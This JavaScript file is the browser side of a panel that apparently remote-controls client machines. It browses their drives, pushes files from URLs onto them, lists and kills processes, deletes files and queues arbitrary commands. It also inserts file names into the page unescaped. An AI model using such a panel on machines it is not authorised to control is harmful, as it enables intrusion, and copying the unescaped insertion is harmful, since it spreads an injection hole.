
var currentPath = "";
var selectedFile;

function getExtension(str) {
	index = str.lastIndexOf(".");
	if (index != -1) ext = str.substr(index + 1).toLowerCase();
	else ext = "file";
	return ext;
}

function sendCommand(command, parameters) {
		
	var data = {};
		
	if (isClientSelected()) {
		data["client"] = getClient();
		data["command"] = command;
		data["parameters"] = parameters;
	
		$.post("command.php", data);
		
		$("#commandinfo .command").html(command);
		$("#commandinfo .parameters").html(parameters);
		
		return true;
	}
	
	return false;
}

function displayFiles() {

	drives = ""; directories = ""; files = "";
	client = getClient();
	url = "uploads/Browse " + client + ".txt";
	
	$.get(url, function(data) {
	
		data = $.trim(data);
		list = data.split("\n");
		
		path = $.trim(list[0].substr(2));
		if (path != currentPath) {
			$("#fileoperations").fadeOut("fast");
			setPath(path);
		}
		else { return; }
		
		$("#browse").html("");
		
		if (list.length > 1) {
			
			if (list[1] == "[Error]") {
				$("#browse").html("Invalid Path.");
				return;
			}
			
			for (i = 1; i < list.length; i++) {
				list[i] = $.trim(list[i]);
				first_char = list[i].substr(0, 1);
				
				if (first_char == "*") {
					temp = list[i].substr(1).split("|");
					drive = temp[0]; type = temp[1];
					str =  "<div class=\"listing\">";
					str += "<img src=\"images/drive.png\" width=\"16\" height=\"16\" /> <a href=\"javascript:\" onclick=\"selectDrive(this);\">";
					str += drive;
					str += " [" + type + "]</a></div>";
					drives += str;
				}
				else if (first_char == "-") {
					dir = list[i].substr(1);
					str =  "<div class=\"listing\">";
					str += "<img src=\"images/dir.png\" width=\"16\" height=\"16\" /> <a href=\"javascript:\" onclick=\"selectDirectory(this);\">";
					str += dir;
					str += "</a></div>";
					directories += str;
				}
				else {
					temp = list[i].split("|");
					file = temp[0]; size = temp[1];
					str =  "<div class=\"listing\">";
					str += "<img src=\"images/ext/" + getExtension(file) + ".png\" width=\"16\" height=\"16\" /> <a href=\"javascript:\" onclick=\"selectFile(this);\">";
					str += file;
					str += "</a> - <span class=\"size\">" + size + "</span></div>";
					files += str;
				}
			}
		
		}
		else {
			$("#browse").html("Empty directory.");
		}
		
		// Show directories before files
		$("#browse").append(drives);
		$("#browse").append(directories);
		$("#browse").append(files);

		var myDiv = document.getElementById("browse-container");
		myDiv.scrollTop = 0;
	
	});

}

function getCurrentTab() {
	return $(".smoothTabs .current a").text();
}

function setPath(path) {
	currentPath = path;
	$("#browsepath").val(currentPath);
}

function isClientSelected() {
	client = $.trim(getClient());
	if (client != "") return true;
	else return false;
}

function getClient() {
	return $("#client").text();
}

function showClients() {

	$.get("clients.php", function(data) {
		data = $.trim(data);
		list = data.split("\n");
		$("#clients").html("");
		
		if (list.length > 0) {
			for (i=0; i < list.length; i++) {
				list[i] = $.trim(list[i]);
				temp = list[i].split("|");
				client = temp[0]; status = temp[1];
				
				str = "<li>";
				if (status == "online") str += "<a href=\"#\">";
				str += client;
				if (status == "online") str += "</a>";
				str += "</li>\n";
				
				$("#clients").append(str);
			}
		}
	
	});
}

function showUploadClients() {

	$.get("clients.php", function(data) {
		data = $.trim(data);
		list = data.split("\n");
		$("#clients-uploads").html("");
		
		if (list.length > 0) {
			for (i=0; i < list.length; i++) {
				list[i] = $.trim(list[i]);
				temp = list[i].split("|");
				client = temp[0]; status = temp[1];
				
				str = "<li><a href=\"javascript:\" class=\"client\">";
				str += client;
				str += "</a><div class=\"box\"></div>";
				str += "</li>\n";
				
				$("#clients-uploads").append(str);
			}
		}
	
	});
}

function showFiles() {
	if (getCurrentTab() == "Browse") {
		if (isClientSelected()) {
			displayFiles();
		}
	}
}

function showCommands() {
	if (getCurrentTab() == "Commands") {
		if (isClientSelected()) {
			client = getClient();
			url = "command.php?showall=true&client=" + encodeURIComponent(client);
			$("#commands").load(url);
		}
	}
}

function showProcesses() {
	if (getCurrentTab() == "Processes") {
		if (isClientSelected()) {
			client = getClient();
			url = "uploads/Processes " + client + ".txt";
			$.get(url, function(data) {
				data = $.trim(data);
				data = data.replace("|", "<br />");
				$("#processlist").html(data);
			});
		}
	}
}

function showNotes(client) {
	url = "notes.php?client=" + encodeURIComponent(client);
	$.get(url, function(data) {
		$("#notes").val(data);
	});
}

function showHome() {
	sendCommand("drives", "");
	$("#fileoperations").fadeOut("fast");
}

function browseDirectory(path) {
	sendCommand("browse", path);
	$("#fileoperations").fadeOut("fast");
}

function directoryUp() {
	path = $.trim(currentPath.substr(0, currentPath.lastIndexOf("\\")));
	if (path != "") browseDirectory(path);
}

function selectFile(element) {
	selectedFile = element;
	file = $.trim($(element).text());
	
	$("#selectedfile").html(file);
	$("#fileoperations").show();
}

function selectDirectory(element) {
	dir = $.trim($(element).text());
	path = currentPath + "\\" + dir;
	browseDirectory(path);
}

function selectDrive(element) {
	drive = $.trim($(element).text());
	drive = drive.substr(0, 2);
	browseDirectory(drive);
}

function fileOperation(command) {
	file = $("#selectedfile").text();
	path = currentPath + "\\" + file;
	sendCommand(command, path);
	$("#fileoperations").fadeOut("slow");
	
	if (command == "delete") { $(selectedFile).parent().fadeOut("slow"); }
	
	selectedFile = "";
}

/* ############################################################### */

$(document).ready(function() {
	$.ajaxSetup ({
		cache: false
	});

	// Smooth Tabs
	$(".smoothTabs").smoothTabs(200);

	/* Event handling for dynamic content */
	$("#clients a").live("click", function() {
		val = $(this).text();
		
		if (val != getClient()) {
			$("#client").html(val);
			// Reset fields
			setPath("");
			$("#browse").html("");
			$("#processlist").html("");
			$("#commands").html("");
			showHome();
			showNotes(val);
		}
	});
	
	/* ----------------------------------------------------------- */
	
	$("#btnBrowse").click(function() {
		path = $.trim($("#browsepath").val());
		
		// Remove slash from the end, if present
		if (path.substr(path.length - 1) == "\\") {
			path = path.substr(0, path.length - 1);
		}
		
		browseDirectory(path);
	});

	$("#btnDownload").click(function() {
		file = $.trim($("#downloadpath").val());
		
		start = $.trim(file.substr(0, 5));
		if (start != "http:") {
			/* If only file name is provided */
			l = window.location.href;
			base = l.substr(0, l.lastIndexOf("/"));
			srcPath = base + "/files/" + file;
		}
		else {
			/* If full URL is provided */
			srcPath = file;
			file = file.substr(file.lastIndexOf("/") + 1);
		}

		targetPath = currentPath + "\\" + file;
		parameters = srcPath + " | " + targetPath;
		sendCommand("download", parameters);
		$("#downloadpath").val("");
	});
	
	/* ----------------------------------------------------------- */
	
	$("#btnAddCommand").click(function() {
		command = $.trim($("#commandinput .command").val());
		parameters = $.trim($("#commandinput .parameters").val());
		if (command != "") {
			$("#commandinput .command").val("");
			$("#commandinput .parameters").val("");
			sendCommand(command, parameters);
		}
		else {
			alert("No command entered.");
		}
		
	});
	
	$("#btnClearCommands").click(function() {
		if (isClientSelected()) {
			client = getClient();
			url = "command.php?clearall=true&client=" + encodeURIComponent(client);
			$.get(url);
		}	
	});
	
	/* ----------------------------------------------------------- */
	
	$("#btnGetProcesses").click(function() {
		sendCommand("processes", "");
	});
	
	$("#btnKillProcess").click(function() {
		process = $.trim($("#process").val());
		if (process != "") {
			sendCommand("killprocess", process);
			$("#process").val("");
		}
	});
	
	/* ----------------------------------------------------------- */
	
	$("#btnSaveNotes").click(function() {
		if (isClientSelected()) {
			var data = {};
			data["client"] = getClient();
			data["notes"] = $.trim($("#notes").val());
		
			$.post("notes.php", data, function() {
				alert("Notes saved.");
			});
		}		
	});
	
	/* ----------------------------------------------------------- */
	
	$("#clients-uploads li a.client").live("click", function() {
		div = $(this).next();
		
		if ($(div).css("display") == "none") {
			client = $(this).text();
			url = "upload.php?client=" + encodeURIComponent(client);
			$.get(url, clientCallback(div));
			$(div).html("Loading...");
			$(div).slideDown("fast");
		}
		else {
			$(div).slideUp("fast");
		}
	});
	
	function clientCallback(div) {
		return function(data) {
			$(div).html(data);
		};
	}
	
	/* ----------------------------------------------------------- */
	
	$("#deleteUpload").live("click", function() {
		target = $(this).attr("href");
		div = $(this).parent();
		$.get(target, deleteUploadCallback(div));
		return false;
	});
	
	function deleteUploadCallback(div) {
		return function(data) {
			$(div).fadeOut("slow");
		};
	}
	
	/* ----------------------------------------------------------- */
	
	showClients();
	showUploadClients();
	setInterval(showClients, 5000);
	setInterval(showCommands, 1000);
	setInterval(showProcesses, 1000);
	setInterval(showFiles, 1000);
	
});
